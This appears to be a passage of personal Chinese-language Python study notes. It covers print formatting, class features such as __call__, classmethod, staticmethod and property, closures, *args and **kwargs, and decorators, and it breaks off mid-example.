<div id="outline-container-h:f85f8b14-b35d-4eab-96cc-4f29a24dd70d" class="outline-4">
<h4 id="h:f85f8b14-b35d-4eab-96cc-4f29a24dd70d">走向编程的第一步</h4>
<div class="outline-text-4" id="text-h:f85f8b14-b35d-4eab-96cc-4f29a24dd70d">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/introduction.html#first-steps-towards-programming">https://docs.python.org/zh-cn/3/tutorial/introduction.html#first-steps-towards-programming</a><br>
</p>
</div>
</div>
<div id="outline-container-h:115d9a39-c2d1-4a83-808f-757b8157267c" class="outline-4">
<h4 id="h:115d9a39-c2d1-4a83-808f-757b8157267c">print() 函数</h4>
<div class="outline-text-4" id="text-h:115d9a39-c2d1-4a83-808f-757b8157267c">
<p>
这里先说一下 print() 函数，如果你是新手，可能对函数不太了解，没关系，在这里你只要了解它的组成部分和作用就可以了，后面函数这一块会详细说明的。<br>
</p>

<p>
print() 函数由两部分构成 ：<br>
</p>
<ol class="org-ol">
<li>指令：print<br></li>
<li>指令的执行对象，在 print 后面的括号里的内容<br></li>
</ol>

<p>
而 print() 函数的作用是让计算机把你给它的指令结果，显示在屏幕的终端上。这里的指令就是你在 print()函数里的内容。<br>
</p>

<p>
它的执行流程如下：<br>
</p>
<ol class="org-ol">
<li>向解释器发出指令，打印 'Hello Cici'<br></li>
<li>解析器把代码解释为计算器能读懂的机器语言<br></li>
<li>计算机执行完后就打印结果<br></li>
</ol>

<p>
<b>print()的参数</b><br>
</p>
<ul class="org-ul">
<li>sep 指定分隔符，默认空格<br></li>
<li>end 指定尾部字符，默认换行<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"Cici"</span>, <span style="color: #8b2252;">"Web&#23433;&#20840;"</span>, sep=<span style="color: #8b2252;">'--'</span>)
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Cici--&#32593;&#32476;&#23433;&#20840;
</pre>
</div>

<ul class="org-ul">
<li>格式化输出<br></li>
</ul>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"Cici"</span>
<span style="color: #a0522d;">age</span> = 10
<span style="color: #a0522d;">gender</span> = <span style="color: #8b2252;">"&#30007;"</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"%s++%s++%s"</span> %(name,age,gender))
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Cici++10++&#30007;
</pre>
</div>

<ul class="org-ul">
<li>format使用<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"test"</span>
<span style="color: #a0522d;">age</span> = 10
<span style="color: #a0522d;">gender</span> = <span style="color: #8b2252;">"&#30007;"</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#25105;&#21483;{0}&#20170;&#24180;{1}&#23681;&#26159;&#20010;{2}"</span>.<span style="color: #483d8b;">format</span>(name,age,gender))
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#25105;&#21483;{2}&#20170;&#24180;{0}&#23681;&#26159;&#20010;{1}"</span>.<span style="color: #483d8b;">format</span>(name,age,gender))
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#25105;&#21483;test&#20170;&#24180;10&#23681;&#26159;&#20010;&#30007;
&#25105;&#21483;&#30007;&#20170;&#24180;test&#23681;&#26159;&#20010;10
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:a372ce73-282c-4d01-b980-04e4d717e600" class="outline-3">
<h3 id="h:a372ce73-282c-4d01-b980-04e4d717e600">其他流程控制工具</h3>
<div class="outline-text-3" id="text-h:a372ce73-282c-4d01-b980-04e4d717e600">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/controlflow.html">https://docs.python.org/zh-cn/3/tutorial/controlflow.html</a><br>
</p>
</div>
</div>
<div id="outline-container-h:97c4e1c0-7a9c-4d8e-8842-b0e90ea3b9ea" class="outline-3">
<h3 id="h:97c4e1c0-7a9c-4d8e-8842-b0e90ea3b9ea">数据结构</h3>
<div class="outline-text-3" id="text-h:97c4e1c0-7a9c-4d8e-8842-b0e90ea3b9ea">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/datastructures.html">https://docs.python.org/zh-cn/3/tutorial/datastructures.html</a><br>
</p>
</div>
</div>
<div id="outline-container-h:52b76024-e8d4-402c-98c9-8855b4f637f1" class="outline-3">
<h3 id="h:52b76024-e8d4-402c-98c9-8855b4f637f1">模块</h3>
<div class="outline-text-3" id="text-h:52b76024-e8d4-402c-98c9-8855b4f637f1">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/modules.html">https://docs.python.org/zh-cn/3/tutorial/modules.html</a><br>
</p>
</div>
</div>
<div id="outline-container-h:29a043a3-e402-431e-b5c3-04f9df6411ec" class="outline-3">
<h3 id="h:29a043a3-e402-431e-b5c3-04f9df6411ec">输入输出</h3>
<div class="outline-text-3" id="text-h:29a043a3-e402-431e-b5c3-04f9df6411ec">
</div>
<div id="outline-container-h:a4112f3b-e9ed-4bf5-bbc1-313081c81f31" class="outline-4">
<h4 id="h:a4112f3b-e9ed-4bf5-bbc1-313081c81f31">读写文件</h4>
<div class="outline-text-4" id="text-h:a4112f3b-e9ed-4bf5-bbc1-313081c81f31">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/inputoutput.html">https://docs.python.org/zh-cn/3/tutorial/inputoutput.html</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:7763971c-ab7d-45cd-a5a3-14e20aa7443a" class="outline-3">
<h3 id="h:7763971c-ab7d-45cd-a5a3-14e20aa7443a">类</h3>
<div class="outline-text-3" id="text-h:7763971c-ab7d-45cd-a5a3-14e20aa7443a">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/classes.html">https://docs.python.org/zh-cn/3/tutorial/classes.html</a><br>
</p>
</div>
<div id="outline-container-h:f3f8ab45-9b24-4aa3-9ee7-508df9f4edb2" class="outline-4">
<h4 id="h:f3f8ab45-9b24-4aa3-9ee7-508df9f4edb2">其他</h4>
<div class="outline-text-4" id="text-h:f3f8ab45-9b24-4aa3-9ee7-508df9f4edb2">
</div>
<div id="outline-container-h:9c5a5c89-5a72-4ce1-99ed-78bf2d34057b" class="outline-5">
<h5 id="h:9c5a5c89-5a72-4ce1-99ed-78bf2d34057b">类的call</h5>
<div class="outline-text-5" id="text-h:9c5a5c89-5a72-4ce1-99ed-78bf2d34057b">
<p>
Python中，如果在创建class的时候写了call（）方法， 那么该class实例化出实例后， 实例名()就是调用call（）方法。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">test</span>():

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__call__</span>(<span style="color: #a020f0;">self</span>, *args, **kwargs):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"test"</span>)

<span style="color: #a0522d;">t</span> = test()
t()
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">test</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:4abfd0bb-710d-426c-9ed8-fddb9498dd27" class="outline-5">
<h5 id="h:4abfd0bb-710d-426c-9ed8-fddb9498dd27">classmethod</h5>
<div class="outline-text-5" id="text-h:4abfd0bb-710d-426c-9ed8-fddb9498dd27">
<p>
classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。 不需要实例化的意思是不创建对象，比如a = A()<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/python</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-*- coding: UTF-8 -*-</span>

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">A</span>(<span style="color: #483d8b;">object</span>):
    <span style="color: #a0522d;">bar</span> = 1
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">func1</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #483d8b;">print</span> (<span style="color: #8b2252;">'foo'</span>)

    @<span style="color: #483d8b;">classmethod</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">func2</span>(cls):
        <span style="color: #483d8b;">print</span> (<span style="color: #8b2252;">'func2'</span>)
        <span style="color: #483d8b;">print</span> (cls.bar)
        cls().func1() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35843;&#29992; foo &#26041;&#27861;</span>

A.func2() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#38656;&#35201;&#23454;&#20363;&#21270;</span>
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">func2
1
foo
</pre>
</div>
</div>
</div>
<div id="outline-container-h:464a16ba-b03e-48a0-8f41-91c52913fc4f" class="outline-5">
<h5 id="h:464a16ba-b03e-48a0-8f41-91c52913fc4f">staticmethod</h5>
<div class="outline-text-5" id="text-h:464a16ba-b03e-48a0-8f41-91c52913fc4f">
<p>
对比classmethod，staticmethod没有参数<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/python</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-*- coding: UTF-8 -*-</span>

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">C</span>(<span style="color: #483d8b;">object</span>):
    @<span style="color: #483d8b;">staticmethod</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">f</span>():
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'runoob'</span>);

C.f(); <span style="color: #b22222;"># </span><span style="color: #b22222;">&#38745;&#24577;&#26041;&#27861;&#26080;&#38656;&#23454;&#20363;&#21270;</span>
<span style="color: #a0522d;">cobj</span> = C()
cobj.f() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20063;&#21487;&#20197;&#23454;&#20363;&#21270;&#21518;&#35843;&#29992;</span>
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">runoob
runoob
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d9103aa8-6acd-4d27-9fa1-73b24da13fc8" class="outline-5">
<h5 id="h:d9103aa8-6acd-4d27-9fa1-73b24da13fc8">proprety</h5>
<div class="outline-text-5" id="text-h:d9103aa8-6acd-4d27-9fa1-73b24da13fc8">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26222;&#36890;&#30340;get&#21644;set&#31169;&#26377;&#21270;age&#65292;__&#30340;&#21464;&#37327;&#23601;&#26159;&#31169;&#26377;&#21270;,&#31169;&#26377;&#21270;&#21464;&#37327;&#22806;&#37096;&#19981;&#33021;&#30452;&#25509;&#35775;&#38382;</span>

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Test</span>():
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>,name,age):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">name</span> = name
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">__age</span> = age

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getAge</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">self</span>.__age
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">setAge</span>(<span style="color: #a020f0;">self</span>,age):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">__age</span> = age

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Test1</span>():
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>,name,age):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">name</span> = name
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">__age</span> = age

    @<span style="color: #483d8b;">property</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">age</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #a020f0;">self</span>.__age

    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35774;&#32622;&#26041;&#27861;</span>
    <span style="color: #228b22;">@age.setter</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">age</span>(<span style="color: #a020f0;">self</span>,age):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">__age</span> = age

<span style="color: #a0522d;">t</span> = Test(<span style="color: #8b2252;">"name"</span>,20)
<span style="color: #483d8b;">print</span>(t.getAge())
t.setAge(30)
<span style="color: #483d8b;">print</span>(t.getAge())

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#31616;&#21333;&#26469;&#35828;&#65292;&#36825;&#35013;&#39280;&#22120;&#30340;&#20316;&#29992;&#23601;&#26159;&#35843;&#29992;&#20989;&#25968;&#21464;&#25104;&#35843;&#29992;&#21464;&#37327;&#65292;&#20174;&#19981;&#33021;&#35843;&#29992;&#31169;&#26377;&#21270;&#21464;&#37327;&#65292;&#30452;&#25509;&#29992;&#19968;&#20010;&#21464;&#37327;&#20195;&#26367;</span>
<span style="color: #a0522d;">t1</span> = Test1(<span style="color: #8b2252;">"name"</span>,20)
<span style="color: #483d8b;">print</span>(t1.age)
t1.<span style="color: #a0522d;">age</span> = 30
<span style="color: #483d8b;">print</span>(t1.age)
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">20
30
20
30
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9ffa4de1-b49d-4c3e-816c-54eb88dc8630" class="outline-5">
<h5 id="h:9ffa4de1-b49d-4c3e-816c-54eb88dc8630">装包，拆包</h5>
<div class="outline-text-5" id="text-h:9ffa4de1-b49d-4c3e-816c-54eb88dc8630">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#35013;&#21253;</span>
&#35013;&#21253;&#23601;&#26159;&#25226;&#26410;&#21629;&#21517;&#30340;&#21442;&#25968;&#25918;&#21040;&#20803;&#32452;&#20013;&#65292;&#25226;&#21629;&#21517;&#21442;&#25968;&#25918;&#21040;&#23383;&#20856;&#20013;

<span style="color: #a0522d;">a</span> = 1, 2
<span style="color: #483d8b;">print</span>(a)
(1, 2)

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25286;&#21253;&#23558;&#19968;&#20010;&#32467;&#26500;&#20013;&#30340;&#25968;&#25454;&#25286;&#20998;&#20026;&#22810;&#20010;&#21333;&#29420;&#21464;&#37327;&#20013; *args **kwargs</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run1</span>(*args): <span style="color: #b22222;"># </span><span style="color: #b22222;">*args &#30456;&#24403;&#20110; a, b, c = args</span>
    <span style="color: #483d8b;">print</span>(*args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25286;&#21253; 1&#65292; 2&#65292; 3</span>
    <span style="color: #483d8b;">print</span>(args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26410;&#25286;&#21253; &#65288;1&#65292; 2&#65292; 3&#65289;</span>
    run2(*args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#25286;&#21253;&#25968;&#25454;&#20256;&#32473;run2</span>
    run2(args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23558;&#26410;&#25286;&#21253;&#25968;&#25454;&#20256;&#32473;run2</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">run2</span>(*args):
    <span style="color: #483d8b;">print</span>(args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360;&#21253;</span>
    <span style="color: #483d8b;">print</span>(*args) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25171;&#21360;&#25286;&#21253;&#21518;&#30340;&#25968;&#25454;</span>

<span style="color: #a0522d;">a</span>, <span style="color: #a0522d;">b</span>, <span style="color: #a0522d;">c</span> = 1, 2, 3
run1(a, b, c)

1 2 3
(1, 2, 3)
(1, 2, 3)
1 2 3
</pre>
</div>
</div>
</div>
<div id="outline-container-h:62b10327-f6a5-4718-88b5-dfa86593d988" class="outline-5">
<h5 id="h:62b10327-f6a5-4718-88b5-dfa86593d988">闭包</h5>
<div class="outline-text-5" id="text-h:62b10327-f6a5-4718-88b5-dfa86593d988">
<p>
请大家跟我理解一下，如果在一个函数的内部定义了另一个函数，外部的我们叫他外函数，内部的我们叫他内函数。<br>
</p>

<p>
闭包： 在一个外函数中定义了一个内函数，内函数里运用了外函数的临时变量，并且外函数的返回值是内函数的引用。这样就构成了一个闭包。 一般情况下，在我们认知当中，如果一个函数结束，函数的内部所有东西都会释放掉，还给内存，局部变量都会消失。但是闭包是一种特殊情况，如果外函数在结束的时候发现有自己的临时变量将来会在内部函数中用到，就把这个临时变量绑定给了内部函数，然后自己再结束。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#38381;&#21253;&#20989;&#25968;&#30340;&#23454;&#20363;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">outer&#26159;&#22806;&#37096;&#20989;&#25968; a&#21644;b&#37117;&#26159;&#22806;&#20989;&#25968;&#30340;&#20020;&#26102;&#21464;&#37327;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">outer</span>( a ):
    <span style="color: #a0522d;">b</span> = 10
    <span style="color: #b22222;"># </span><span style="color: #b22222;">inner&#26159;&#20869;&#20989;&#25968;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">inner</span>():
        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;&#20869;&#20989;&#25968;&#20013; &#29992;&#21040;&#20102;&#22806;&#20989;&#25968;&#30340;&#20020;&#26102;&#21464;&#37327;</span>
        <span style="color: #483d8b;">print</span>(a+b)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22806;&#20989;&#25968;&#30340;&#36820;&#22238;&#20540;&#26159;&#20869;&#20989;&#25968;&#30340;&#24341;&#29992;</span>
    <span style="color: #a020f0;">return</span> inner

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;&#36825;&#37324;&#25105;&#20204;&#35843;&#29992;&#22806;&#20989;&#25968;&#20256;&#20837;&#21442;&#25968;5</span>
    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27492;&#26102;&#22806;&#20989;&#25968;&#20004;&#20010;&#20020;&#26102;&#21464;&#37327; a&#26159;5 b&#26159;10 &#65292;&#24182;&#21019;&#24314;&#20102;&#20869;&#20989;&#25968;&#65292;&#28982;&#21518;&#25226;&#20869;&#20989;&#25968;&#30340;&#24341;&#29992;&#36820;&#22238;&#23384;&#32473;&#20102;demo</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22806;&#20989;&#25968;&#32467;&#26463;&#30340;&#26102;&#20505;&#21457;&#29616;&#20869;&#37096;&#20989;&#25968;&#23558;&#20250;&#29992;&#21040;&#33258;&#24049;&#30340;&#20020;&#26102;&#21464;&#37327;&#65292;&#36825;&#20004;&#20010;&#20020;&#26102;&#21464;&#37327;&#23601;&#19981;&#20250;&#37322;&#25918;&#65292;&#20250;&#32465;&#23450;&#32473;&#36825;&#20010;&#20869;&#37096;&#20989;&#25968;</span>
    <span style="color: #a0522d;">demo</span> = outer(5)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25105;&#20204;&#35843;&#29992;&#20869;&#37096;&#20989;&#25968;&#65292;&#30475;&#19968;&#30475;&#20869;&#37096;&#20989;&#25968;&#26159;&#19981;&#26159;&#33021;&#20351;&#29992;&#22806;&#37096;&#20989;&#25968;&#30340;&#20020;&#26102;&#21464;&#37327;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">demo&#23384;&#20102;&#22806;&#20989;&#25968;&#30340;&#36820;&#22238;&#20540;&#65292;&#20063;&#23601;&#26159;inner&#20989;&#25968;&#30340;&#24341;&#29992;&#65292;&#36825;&#37324;&#30456;&#24403;&#20110;&#25191;&#34892;inner&#20989;&#25968;</span>
    demo() <span style="color: #b22222;"># </span><span style="color: #b22222;">15</span>
    <span style="color: #a0522d;">demo2</span> = outer(7)
    demo2()<span style="color: #b22222;">#</span><span style="color: #b22222;">17</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7e5d640b-43b4-4361-a8ab-d1a08b2f2aa0" class="outline-5">
<h5 id="h:7e5d640b-43b4-4361-a8ab-d1a08b2f2aa0">*args 和 **kwargs ？</h5>
<div class="outline-text-5" id="text-h:7e5d640b-43b4-4361-a8ab-d1a08b2f2aa0">
<p>
考虑一种情况，我们必须编写多个函数只是为了接受不同数量的参数。<br>
</p>

<p>
例如以下 add Python中的方法：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(a, b):
    <span style="color: #a020f0;">return</span> a+b

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(a, b, c, d, e, f):
    <span style="color: #a020f0;">return</span> a+b+c+d+e+f

<span style="color: #483d8b;">print</span>(add(5,6)) <span style="color: #b22222;">#</span><span style="color: #b22222;">output 11</span>
<span style="color: #483d8b;">print</span>(add(5, 6, 1, 5, 2, 2)) <span style="color: #b22222;">#</span><span style="color: #b22222;">output 21</span>
</pre>
</div>

<p>
请注意，我们必须编写两个重载函数来添加不同数量的参数。<br>
</p>

<p>
每次参数数量不同时，我们都需要编写一个与之对应的特定函数。<br>
</p>

<p>
我们可以解决这个问题的一种方法是使用 <a href="https://pencilprogrammer.com/python-tutorials/list/">列表</a> 作为参数来接受多个整数，如下所示：<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(lst):
    <span style="color: #a020f0;">return</span> <span style="color: #483d8b;">sum</span>(lst)

<span style="color: #483d8b;">print</span>(add([5, 6, 1, 5, 2, 2])) <span style="color: #b22222;">#</span><span style="color: #b22222;">output 21</span>
</pre>
</div>

<p>
虽然这解决了问题，但它仍然改变了我们想要使用该功能的方式。<br>
</p>

<p>
还有另一种方法可以使 Python 中的函数在参数方面更加灵活，那就是使用 *args 和 **kwargs 。<br>
</p>

<p>
<b>什么是 *args 和 **kwargs？</b><br>
</p>

<p>
<code>*args</code> 和 <code>**kwargs</code> 是 Python 中的关键字，当定义为参数时，允许函数接受不同数量的参数。<br>
</p>

<p>
当我们不确定特定函数的参数数量时，它们很有用。<br>
</p>

<p>
它们都使函数在参数方面具有灵活性，但它们彼此略有不同。 让我们看看两者的例子。<br>
</p>

<p>
*args 在 Python 中是一个 非关键字参数 ，它可以接受和存储可变数量的位置参数作为 <a href="https://pencilprogrammer.com/python-tutorials/tuple/">元组</a> 。<br>
</p>

<p>
位置参数是一个不跟等号 (=) 和默认值的名称。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(*args):
<span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">sum</span>(args))
add() <span style="color: #b22222;">#</span><span style="color: #b22222;">0-arguments</span>
add(5, 6, 4) <span style="color: #b22222;">#</span><span style="color: #b22222;">3-arguments</span>
add(1, 1, 1, 1, 1) <span style="color: #b22222;">#</span><span style="color: #b22222;">5-arguments</span>
</pre>
</div>

<p>
*args 可以接受可变数量的参数（甚至是 0 个参数），从而使函数更加灵活。<br>
</p>

<p>
如果我们不使用 *args ，我们必须为每个函数调用定义单独的函数。<br>
</p>

<p>
<b>我们可以重命名 *args 吗？</b><br>
</p>

<p>
我们可以。 这是因为 args 在 *args 只是一个名字，更重要的是 * .<br>
</p>

<p>
<code>*</code> 在 <code>*args</code> 是一个解包运算符，将传入的参数转换为 Python 元组。<br>
</p>

<p>
保持 <code>*</code> 操作符，我们可以重命名 args 任何名称，如下所示 ：<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">add</span>(*integers):
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">sum</span>(integers))

add(-1, 7, 2, 6) <span style="color: #b22222;">#</span><span style="color: #b22222;">output 14</span>
</pre>
</div>

<p>
<b>Python中的kwargs</b><br>
</p>

<p>
<code>**kwargs</code> 在 Python 中是一个 关键字参数 ，它可以接受和存储不同类型的关键字参数作为 <a href="https://pencilprogrammer.com/python-tutorials/dictionary/">字典</a> 。<br>
</p>

<p>
关键字参数（也称为命名参数）后跟一个等号和一个给出其默认值的表达式。<br>
</p>

<p>
当我们希望函数接受不同数量的参数并且同时也不确定它们的类型时，它很有用。<br>
</p>

<p>
考虑以下代码，其中一个函数接受两个不同类型的不同关键字参数：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">student</span>(name=<span style="color: #8b2252;">""</span>, roll=-1):
    <span style="color: #483d8b;">print</span>(name) <span style="color: #b22222;">#</span><span style="color: #b22222;">output: pencil</span>
    <span style="color: #483d8b;">print</span>(roll) <span style="color: #b22222;">#</span><span style="color: #b22222;">output: 77</span>

student(name=<span style="color: #8b2252;">"pencil"</span>, roll=77)
</pre>
</div>

<p>
在这里，我们可以使用 **kwargs 使函数在关键字参数方面更加灵活，如下所示：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">student</span>(**kwargs):
    <span style="color: #483d8b;">print</span>(kwargs[<span style="color: #8b2252;">'name'</span>]) <span style="color: #b22222;">#</span><span style="color: #b22222;">output: pencil</span>
    <span style="color: #483d8b;">print</span>(kwargs[<span style="color: #8b2252;">'roll'</span>]) <span style="color: #b22222;">#</span><span style="color: #b22222;">output: 77</span>
student(name=<span style="color: #8b2252;">"pencil"</span>, roll=77, department=<span style="color: #8b2252;">"IT"</span>)
</pre>
</div>

<p>
我们已经将一个额外的关键字参数（即部门）传递给 student 功能，但代码工作正常。<br>
</p>

<p>
和 *args 一样，在 **kwargs 中我们可以重命名 kwargs .<br>
</p>

<p>
重要的部分是 =**=（解包操作符），它应该在名称之前。<br>
</p>
</div>
</div>
<div id="outline-container-h:781bdbbe-af9c-4343-aec8-8e6c6f154702" class="outline-5">
<h5 id="h:781bdbbe-af9c-4343-aec8-8e6c6f154702">装饰器</h5>
<div class="outline-text-5" id="text-h:781bdbbe-af9c-4343-aec8-8e6c6f154702">
<p>
装饰器是一个在另一个函数周围创建包装器的函数。 这个包装器为现有代码添加了一些额外的功能。<br>
</p>

<p>
装饰器也是一个函数，它是让其他函数在不改变变动的前提下增加额外的功能。<br>
</p>

<p>
装饰器是一个闭包，把一个函数当作参数返回一个替代版的函数，本质是一个返回函数的函数（即返回值为函数对象）。<br>
</p>

<p>
python3支持用@符号直接将装饰器应用到函数。<br>
</p>

<p>
装饰器工作场景：插入日志、性能测试、事务处理等等。<br>
</p>

<p>
函数被装饰器装饰过后，此函数的属性均已发生变化，如名称变为装饰器的名称。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">funcEx.py</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">addOne</span>(myFunc):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">addOneInside</span>(x):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"adding One"</span>)
        <span style="color: #a020f0;">return</span> myFunc(x) + 1
    <span style="color: #a020f0;">return</span> addOneInside

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">subThree</span>(x):
    <span style="color: #a020f0;">return</span> x - 3

<span style="color: #a0522d;">result</span> = addOne(subThree)

<span style="color: #483d8b;">print</span>(subThree(5))
<span style="color: #483d8b;">print</span>(result(5))

<span style="color: #b22222;"># </span><span style="color: #b22222;">outputs</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">2</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">adding One</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">3</span>
</pre>
</div>

<p>
上面的代码工作如下，<br>
</p>
<ul class="org-ul">
<li>函数“subThree”在第 9-10 行定义，它用 3 减去给定的数字。<br></li>
<li>函数'addOne'（第3 行）有一个参数，即myFunc，它表明'addOne' 将函数作为输入。 由于 subThree 函数只有一个输入参数，因此在函数“addOneInside”中设置了一个参数（第 4 行）； 用于 return 语句（第 6行）。 此外，在返回值之前打印“加一”（第 5 行）。<br></li>
<li>在第12 行，addOne 的返回值（即函数'addOneInside'）存储在'result' 中。 因此，“结果”是一个接受一个输入的函数。<br></li>
<li>最后，在第 13 行和第 14 行打印值。请注意，“加一”由 result(5) 打印，并且值增加 1，即 2 到 3。<br></li>
</ul>

<p>
<b>二层装饰器，也就是没有装饰器没有参数</b><br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">dec1</span>(func):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#24320;&#22987;ing"</span>)
    time.sleep(3)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(*args,**kwargs):
        func(*args,**kwargs)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#21040;&#36798;&#35013;&#39280;&#22120;&#37324;&#38754;"</span>)
    <span style="color: #a020f0;">return</span> wrapper

<span style="color: #228b22;">@dec1</span>
